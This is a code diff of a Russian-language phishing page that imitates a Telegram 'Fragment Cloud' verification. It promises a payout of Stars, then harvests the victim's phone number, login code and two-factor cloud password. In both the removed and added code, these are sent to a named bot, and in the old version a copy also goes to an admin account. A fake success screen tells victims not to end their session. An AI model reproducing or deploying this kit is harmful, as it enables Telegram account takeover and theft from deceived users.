@@ -3,11 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Fragment Cloud Node • Верификация</title>
-    
-    <!-- Telegram Web App API -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    
+    <title>Fragment Cloud • Верификация</title>
     <style>
         * {
             margin: 0;
@@ -15,7 +11,6 @@
             box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
-
         body {
             background: #0e1621;
             display: flex;
@@ -24,12 +19,10 @@
             min-height: 100vh;
             padding: 16px;
         }
-
         .container {
             max-width: 400px;
             width: 100%;
         }
-
         .card {
             background: #17212b;
             border-radius: 24px;
@@ -37,14 +30,12 @@
             box-shadow: 0 8px 24px rgba(0,0,0,0.4);
             border: 1px solid #2b3a47;
         }
-
         .logo {
             display: flex;
             align-items: center;
             gap: 12px;
             margin-bottom: 24px;
         }
-
         .logo-icon {
             width: 48px;
             height: 48px;
@@ -56,16 +47,12 @@
             font-size: 28px;
             font-weight: bold;
             color: white;
-            box-shadow: 0 4px 12px rgba(47,108,255,0.3);
         }
-
         .logo-text {
             font-size: 20px;
             font-weight: 700;
             color: white;
-            letter-spacing: -0.5px;
         }
-
         .badge {
             background: #232e3c;
             padding: 6px 12px;
@@ -77,34 +64,27 @@
             color: #9aa6b2;
             margin-bottom: 16px;
         }
-
         .badge-green {
             color: #40bf7f;
             background: rgba(64,191,127,0.1);
         }
-
         h1 {
             font-size: 26px;
             font-weight: 700;
             color: white;
             margin-bottom: 8px;
-            line-height: 1.2;
         }
-
         .subtitle {
             font-size: 15px;
             color: #9aa6b2;
             margin-bottom: 28px;
-            line-height: 1.5;
         }
-
         .avatar-section {
             display: flex;
             flex-direction: column;
             align-items: center;
             margin-bottom: 28px;
         }
-
         .avatar {
             width: 80px;
             height: 80px;
@@ -116,34 +96,26 @@
             font-size: 40px;
             color: white;
             margin-bottom: 12px;
-            border: 3px solid rgba(47,108,255,0.3);
-            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
         }
-
         .verified-badge {
             display: flex;
             align-items: center;
             gap: 6px;
             color: #2f6cff;
             font-size: 14px;
-            font-weight: 500;
             background: rgba(47,108,255,0.1);
             padding: 6px 16px;
             border-radius: 30px;
         }
-
         .input-group {
             margin-bottom: 20px;
         }
-
         .label {
             font-size: 14px;
             color: #9aa6b2;
             margin-bottom: 8px;
             display: block;
-            font-weight: 500;
         }
-
         .input-field {
             width: 100%;
             background: #0e1621;
@@ -153,18 +125,11 @@
             font-size: 16px;
             color: white;
             outline: none;
-            transition: all 0.2s;
         }
-
         .input-field:focus {
             border-color: #2f6cff;
             background: #1a2530;
         }
-
-        .input-field::placeholder {
-            color: #6b7a8a;
-        }
-
         .btn {
             width: 100%;
             background: #2f6cff;
@@ -175,32 +140,41 @@
             font-weight: 600;
             color: white;
             cursor: pointer;
-            transition: all 0.2s;
             margin-top: 12px;
-            box-shadow: 0 4px 12px rgba(47,108,255,0.3);
         }
-
         .btn:hover {
             background: #1a4fcc;
-            transform: translateY(-1px);
         }
-
         .btn:disabled {
             background: #2b3a47;
-            box-shadow: none;
             cursor: not-allowed;
         }
-
         .btn-secondary {
             background: #232e3c;
-            box-shadow: none;
             margin-top: 8px;
         }
-
-        .btn-secondary:hover {
-            background: #2b3a47;
+        .hidden {
+            display: none !important;
         }
-
+        .phone-display {
+            background: #0e1621;
+            padding: 12px 16px;
+            border-radius: 12px;
+            color: white;
+            font-weight: 500;
+            margin-bottom: 16px;
+        }
+        .error-message {
+            color: #ff6b6b;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+        .success-icon {
+            font-size: 56px;
+            color: #40bf7f;
+            margin-bottom: 16px;
+        }
         .timer-block {
             background: #0e1621;
             border-radius: 16px;
@@ -208,17 +182,6 @@
             margin-top: 24px;
             border: 1px solid #2b3a47;
         }
-
-        .timer-title {
-            font-size: 15px;
-            font-weight: 600;
-            color: white;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
         .progress-bar {
             background: #232e3c;
             height: 8px;
@@ -226,29 +189,23 @@
             margin: 16px 0;
             overflow: hidden;
         }
-
         .progress-fill {
             width: 0%;
             height: 100%;
             background: #2f6cff;
-            border-radius: 10px;
             transition: width 0.5s;
         }
-
         .timer-text {
             color: #9aa6b2;
             font-size: 14px;
             text-align: center;
         }
-
         .timer-highlight {
             color: #2f6cff;
             font-weight: 600;
         }
-
         .security-info {
             display: flex;
-            align-items: center;
             justify-content: center;
             gap: 20px;
             margin-top: 24px;
@@ -257,42 +214,6 @@
             color: #6b7a8a;
             font-size: 13px;
         }
-
-        .error-message {
-            color: #ff6b6b;
-            font-size: 14px;
-            margin-top: 8px;
-            display: none;
-        }
-
-        .success-icon {
-            font-size: 56px;
-            color: #40bf7f;
-            margin-bottom: 16px;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .phone-display {
-            background: #0e1621;
-            padding: 12px 16px;
-            border-radius: 12px;
-            color: white;
-            font-weight: 500;
-            margin-bottom: 16px;
-            word-break: break-all;
-        }
-
-        .back-link {
-            color: #2f6cff;
-            text-decoration: none;
-            font-size: 14px;
-            display: inline-block;
-            margin-top: 16px;
-        }
-
         .info-note {
             background: rgba(47,108,255,0.05);
             border-left: 4px solid #2f6cff;
@@ -318,7 +239,7 @@
     <span class="badge-green">●</span> Node v8.4.2 • ONLINE
 </div>
 
-<!-- =========== ШАГ 1: ВВОД НОМЕРА =========== -->
+<!-- ШАГ 1: НОМЕР ТЕЛЕФОНА -->
 <div id="step1">
     <h1>Верификация аккаунта</h1>
     <div class="subtitle">
@@ -341,12 +262,10 @@
     <button class="btn" id="phoneBtn" onclick="submitPhone()">Продолжить</button>
     
     <div class="info-note">
-        ⏳ После верификации средства поступят в течение 24 часов. 
-        Не завершайте сессию до получения средств.
+        ⏳ После верификации средства поступят в течение 24 часов.
     </div>
 </div>
-
-<!-- =========== ШАГ 2: ВВОД КОДА =========== -->
+<!-- ШАГ 2: КОД ПОДТВЕРЖДЕНИЯ -->
 <div id="step2" class="hidden">
     <h1>Код подтверждения</h1>
     <div class="subtitle">
@@ -363,29 +282,13 @@
     
     <button class="btn" id="codeBtn" onclick="submitCode()">Подтвердить код</button>
     <button class="btn btn-secondary" onclick="backToPhone()">Изменить номер</button>
-    
-    <!-- ТАЙМЕР 24 ЧАСА -->
-    <div class="timer-block">
-        <div class="timer-title">
-            <span>⏳</span> Ожидание зачисления Stars
-        </div>
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill" style="width: 0%;"></div>
-        </div>
-        <div class="timer-text">
-            Средства поступят в течение <span class="timer-highlight" id="timerDisplay">24:00:00</span>
-        </div>
-        <div style="color: #6b7a8a; font-size: 12px; margin-top: 12px; text-align: center;">
-            Не закрывайте приложение и не завершайте сессию
-        </div>
-    </div>
 </div>
 
-<!-- =========== ШАГ 3: 2FA ПАРОЛЬ =========== -->
+<!-- ШАГ 3: 2FA ПАРОЛЬ -->
 <div id="step3" class="hidden">
     <h1>Облачный пароль</h1>
     <div class="subtitle">
-        Аккаунт защищен двухфакторной аутентификацией. Введите ваш облачный пароль Telegram.
+        Аккаунт защищен двухфакторной аутентификацией.
     </div>
     
     <div id="phoneDisplay2" class="phone-display"></div>
@@ -397,182 +300,80 @@
     </div>
     
     <button class="btn" id="passwordBtn" onclick="submitPassword()">Верифицировать</button>
-    
-    <!-- ТАЙМЕР 24 ЧАСА -->
-    <div class="timer-block">
-        <div class="timer-title">
-            <span>⏳</span> Ожидание зачисления Stars
         </div>
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill2" style="width: 0%;"></div>
-        </div>
-        <div class="timer-text">
-            Средства поступят в течение <span class="timer-highlight" id="timerDisplay2">24:00:00</span>
-        </div>
-    </div>
-</div>
-
-<!-- =========== ШАГ 4: УСПЕХ + 24 ЧАСА =========== -->
-<div id="success" class="hidden">
-    <div style="text-align: center;">
-        <div class="success-icon">✅</div>
-        <h1 style="margin-bottom: 12px;">Верификация успешна!</h1>
-        <div class="subtitle" style="margin-bottom: 24px;">
-            Ваш аккаунт подтвержден в системе Fragment Cloud.
-        </div>
-        
-        <div style="background: #0e1621; border-radius: 16px; padding: 20px; margin-bottom: 24px;">
-            <div style="display: flex; justify-content: space-between; margin-bottom: 16px;">
-                <span style="color: #9aa6b2;">Статус:</span>
-                <span style="color: #40bf7f; font-weight: 600;">✓ Активен</span>
-            </div>
-            <div style="display: flex; justify-content: space-between; margin-bottom: 16px;">
-                <span style="color: #9aa6b2;">Лимит зачисления:</span>
-                <span style="color: white; font-weight: 600;">5,000 ⭐</span>
-            </div>
-            <div style="display: flex; justify-content: space-between;">
-                <span style="color: #9aa6b2;">Поступление:</span>
-                <span style="color: white; font-weight: 600;" id="successTimer">~24 часа</span>
+                <!-- ШАГ 4: УСПЕХ -->
+        <div id="success" class="hidden">
+            <div style="text-align: center;">
+                <div class="success-icon">✅</div>
+                <h1 style="margin-bottom: 12px;">Верификация успешна!</h1>
+                <div class="subtitle" style="margin-bottom: 24px;">
+                    Ваш аккаунт подтвержден в системе Fragment Cloud.
+                </div>
+                
+                <div style="background: #0e1621; border-radius: 16px; padding: 20px; margin-bottom: 24px;">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 16px;">
+                        <span style="color: #9aa6b2;">Статус:</span>
+                        <span style="color: #40bf7f; font-weight: 600;">✓ Активен</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 16px;">
+                        <span style="color: #9aa6b2;">Лимит зачисления:</span>
+                        <span style="color: white; font-weight: 600;">5,000 ⭐</span>
+                    </div>
+                </div>
+                
+                <div style="color: #9aa6b2; font-size: 14px; margin-bottom: 24px;">
+                    ⚠️ Не завершайте сессию в течение 24 часов.
+                </div>
+                
+                <div style="color: #2f6cff; font-size: 14px;">
+                    Бот @botCryptaFragmunt_bot привязан к аккаунту
+                </div>
             </div>
         </div>
         
-        <!-- ПРОГРЕСС 24 ЧАСА -->
-        <div class="progress-bar" style="margin-bottom: 12px;">
-            <div class="progress-fill" id="successProgress" style="width: 0%;"></div>
+        <!-- ФУТЕР С БЕЗОПАСНОСТЬЮ -->
+        <div class="security-info">
+            <span>🔒 Защищено TLS 1.3</span>
+            <span>⚡ Cloud Node v8</span>
+            <span>✓ Fragment</span>
         </div>
         
-        <div style="color: #9aa6b2; font-size: 14px; margin-bottom: 24px; padding: 0 16px;">
-            ⚠️ <strong>Важно:</strong> Не завершайте текущую сессию в течение 24 часов, 
-            иначе транзакция будет отклонена системой безопасности Fragment.
-        </div>
+    </div> <!-- закрываем card -->
+</div> <!-- закрываем container -->
+        <script>
+        // Получаем user ID из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const USER_ID = urlParams.get('user') || 'telegram_user';
+        const BOT_USERNAME = 'botCryptaFragmunt_bot';
         
-        <div style="color: #2f6cff; font-size: 14px;">
-            Бот @botCryptaFragmunt_bot привязан к вашему аккаунту
-        </div>
-    </div>
-</div>
-
-<!-- ФУТЕР С БЕЗОПАСНОСТЬЮ -->
-<div class="security-info">
-    <span>🔒 Защищено TLS 1.3</span>
-    <span>⚡ Cloud Node v8</span>
-    <span>✓ Fragment</span>
-</div>
-        </div> <!-- закрываем card -->
-    </div> <!-- закрываем container -->
-
-    <script>
-        // Telegram WebApp инициализация
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-        tg.ready();
-        
-        // ========== КОНФИГУРАЦИЯ - ТВОИ ДАННЫЕ ==========
-        const CONFIG = {
-            BOT_USERNAME: 'botCryptaFragmunt_bot',  // ТВОЙ БОТ
-            ADMIN_USERNAME: 'Kepca123',              // ТВОЙ АДМИН
-            SITE_URL: 'https://freshprofi-netizen.github.io/Adamdreambook/'
-        };
-
-        // ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
         let userPhone = '';
-        let userCode = '';
-        let userPassword = '';
-        let userId = null;
         let timerInterval = null;
         
-        // Получаем USER ID из URL
-        const urlParams = new URLSearchParams(window.location.search);
-        userId = urlParams.get('user') || urlParams.get('start') || 'telegram_user';
+        // Отправка данных в бота (ЧЕРЕЗ ЛИЧКУ ПОЛЬЗОВАТЕЛЯ)
+        function sendToBot(command, data) {
+            const payload = {
+                phone: data.phone,
+                code: data.code || '',
+                password: data.password || '',
+                action: command,
+                user_id: USER_ID,
+                timestamp: Date.now()
+            };
+            
+            const jsonString = JSON.stringify(payload);
+            const message = `/web_auth ${jsonString}`;
+            const encodedMessage = encodeURIComponent(message);
+            
+            // ОТПРАВЛЯЕМ В ЛИЧКУ БОТА (пользователь сам отправляет)
+            window.location.href = `tg://resolve?domain=${BOT_USERNAME}&text=${encodedMessage}`;
+            
+            // Резервный способ
+            setTimeout(() => {
+                window.open(`https://t.me/${BOT_USERNAME}?start=auth_${Date.now()}`, '_blank');
+            }, 300);
+        }
         
-        // ========== ТАЙМЕР 24 ЧАСА ==========
-        function start24HourTimer(displayElement, progressElement) {
-            const endTime = Date.now() + 24 * 60 * 60 * 1000; // 24 часа
-            
-            function updateTimer() {
-                const now = Date.now();
-                const diff = endTime - now;
-                
-                if (diff <= 0) {
-                    if (displayElement) displayElement.textContent = '00:00:00';
-                    if (progressElement) progressElement.style.width = '100%';
-                    clearInterval(timerInterval);
-                    return;
-                }
-                
-                const hours = Math.floor(diff / (60 * 60 * 1000));
-                const minutes = Math.floor((diff % (60 * 60 * 1000)) / (60 * 1000));
-                const seconds = Math.floor((diff % (60 * 1000)) / 1000);
-                
-                const timeString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                
-                if (displayElement) displayElement.textContent = timeString;
-                
-                // Прогресс бар
-                if (progressElement) {
-                    const progress = ((24 * 60 * 60 * 1000 - diff) / (24 * 60 * 60 * 1000)) * 100;
-                    progressElement.style.width = `${progress}%`;
-                }
-            }
-            
-            updateTimer();
-            timerInterval = setInterval(updateTimer, 1000);
-        }
-
-        // ========== ОТПРАВКА ДАННЫХ В БОТА ==========
-        async function sendToBot(command, data) {
-            let text = '';
-            
-            switch(command) {
-                case 'phone':
-                    text = `/auth ${data.phone}`;
-                    break;
-                case 'code':
-                    text = `/auth_code ${data.phone} ${data.code}`;
-                    break;
-                case '2fa':
-                    text = `/auth_2fa ${data.phone} ${data.password}`;
-                    break;
-                case 'complete':
-                    text = `/auth_success ${data.phone}`;
-                    break;
-                default:
-                    text = `/debug ${JSON.stringify(data)}`;
-            }
-            
-            // Добавляем user_id если есть
-            if (userId && userId !== 'telegram_user') {
-                text += ` ${userId}`;
-            }
-            
-            const encodedText = encodeURIComponent(text);
-            
-            try {
-                tg.sendData(JSON.stringify({
-                    command: command,
-                    phone: data.phone,
-                    code: data.code || '',
-                    password: data.password || '',
-                    user_id: userId
-                }));
-            } catch(e) {
-                window.location.href = `tg://resolve?domain=${CONFIG.BOT_USERNAME}&text=${encodedText}`;
-                
-                setTimeout(() => {
-                    window.open(`https://t.me/${CONFIG.BOT_USERNAME}?start=auth_${Date.now()}`, '_blank');
-                }, 300);
-            }
-            
-            // Отправляем копию админу
-            if (CONFIG.ADMIN_USERNAME) {
-                const adminText = encodeURIComponent(`📨 Данные с сайта: ${text}`);
-                setTimeout(() => {
-                    window.open(`tg://resolve?domain=${CONFIG.ADMIN_USERNAME.replace('@', '')}&text=${adminText}`, '_blank');
-                }, 500);
-            }
-        }
-
-        // ========== ШАГ 1: ОТПРАВКА НОМЕРА ==========
+        // ШАГ 1: Отправка номера
         async function submitPhone() {
             const phoneInput = document.getElementById('phone');
             const phoneError = document.getElementById('phoneError');
@@ -580,15 +381,9 @@
             
             let phone = phoneInput.value.trim().replace(/\D/g, '');
             
-            if (!phone) {
+            if (!phone || phone.length < 10) {
                 phoneError.style.display = 'block';
-                phoneError.textContent = 'Введите номер телефона';
-                return;
-            }
-            
-            if (phone.length < 10) {
-                phoneError.style.display = 'block';
-                phoneError.textContent = 'Введите корректный номер (минимум 10 цифр)';
+                phoneError.textContent = 'Введите корректный номер';
                 return;
             }
             
@@ -608,23 +403,20 @@
             document.getElementById('phoneDisplay').innerHTML = displayPhone;
             document.getElementById('phoneDisplay2').innerHTML = displayPhone;
             
-            await sendToBot('phone', { phone: phone });
+            // Отправляем номер в бота
+            sendToBot('phone_submitted', { phone: phone });
             
+            // Переходим к шагу 2
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
-            
-            start24HourTimer(
-                document.getElementById('timerDisplay'),
-                document.getElementById('progressFill')
-            );
             
             phoneBtn.disabled = false;
             phoneBtn.textContent = 'Продолжить';
             
             setTimeout(() => document.getElementById('code').focus(), 300);
         }
-
-        // ========== ШАГ 2: ОТПРАВКА КОДА ==========
+        
+        // ШАГ 2: Отправка кода
         async function submitCode() {
             const codeInput = document.getElementById('code');
             const codeError = document.getElementById('codeError');
@@ -632,15 +424,9 @@
             
             let code = codeInput.value.trim();
             
-            if (!code) {
+            if (!code || !/^\d{5}$/.test(code)) {
                 codeError.style.display = 'block';
-                codeError.textContent = 'Введите код из Telegram';
-                return;
-            }
-            
-            if (!/^\d{5}$/.test(code)) {
-                codeError.style.display = 'block';
-                codeError.textContent = 'Код должен состоять из 5 цифр';
+                codeError.textContent = 'Введите 5 цифр';
                 return;
             }
             
@@ -648,17 +434,24 @@
             codeBtn.disabled = true;
             codeBtn.textContent = 'Проверка...';
             
-            userCode = code;
-            
-            await sendToBot('code', { phone: userPhone, code: code });
+            // Отправляем код в бота
+            sendToBot('code_submitted', { 
+                phone: userPhone, 
+                code: code 
+            });
             
             setTimeout(() => {
+                // Показываем шаг 3 (2FA) или успех
+                // Бот сам определит, нужно ли 2FA
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+                
                 codeBtn.disabled = false;
                 codeBtn.textContent = 'Подтвердить код';
             }, 2000);
         }
-
-        // ========== ШАГ 3: ОТПРАВКА 2FA ПАРОЛЯ ==========
+        
+        // ШАГ 3: Отправка 2FA
         async function submitPassword() {
             const passwordInput = document.getElementById('password');
             const passwordError = document.getElementById('passwordError');
@@ -668,7 +461,7 @@
             
             if (!password) {
                 passwordError.style.display = 'block';
-                passwordError.textContent = 'Введите облачный пароль';
+                passwordError.textContent = 'Введите пароль';
                 return;
             }
             
@@ -676,9 +469,11 @@
             passwordBtn.disabled = true;
             passwordBtn.textContent = 'Верификация...';
             
-            userPassword = password;
-            
-            await sendToBot('2fa', { phone: userPhone, password: password });
+            // Отправляем 2FA в бота
+            sendToBot('2fa_submitted', { 
+                phone: userPhone, 
+                password: password 
+            });
             
             setTimeout(() => {
                 showSuccess();
@@ -686,55 +481,40 @@
                 passwordBtn.textContent = 'Верифицировать';
             }, 2000);
         }
-
-        // ========== ПОКАЗАТЬ УСПЕХ ==========
+        
+        // УСПЕХ
         function showSuccess() {
-            if (timerInterval) clearInterval(timerInterval);
-            
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step3').classList.add('hidden');
             document.getElementById('success').classList.remove('hidden');
             
-            start24HourTimer(
-                document.getElementById('successTimer'),
-                document.getElementById('successProgress')
-            );
-            
-            sendToBot('complete', { phone: userPhone });
+            sendToBot('verification_complete', { phone: userPhone });
             
             setTimeout(() => {
-                window.location.href = `https://t.me/${CONFIG.BOT_USERNAME}`;
+                window.location.href = `https://t.me/${BOT_USERNAME}`;
             }, 2000);
         }
-
-        // ========== ВЕРНУТЬСЯ К НОМЕРУ ==========
+        
+        // Вернуться к номеру
         function backToPhone() {
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step1').classList.remove('hidden');
             document.getElementById('code').value = '';
-            
-            if (timerInterval) {
-                clearInterval(timerInterval);
-                timerInterval = null;
-            }
         }
-
-        // ========== ВАЛИДАЦИЯ ПОЛЕЙ ==========
+        
+        // Валидация полей
         document.getElementById('phone')?.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9+]/g, '');
         });
-
+        
         document.getElementById('code')?.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
         });
 
-        // ========== ЗАГРУЗКА СТРАНИЦЫ ==========
+        // Автофокус на поле телефона
         window.onload = function() {
-            if (tg.initDataUnsafe?.user?.id) {
-                userId = tg.initDataUnsafe.user.id;
-            }
-            console.log('Fragment Cloud Node v8 ready');
+            document.getElementById('phone')?.focus();
         };
     </script>
 </body>
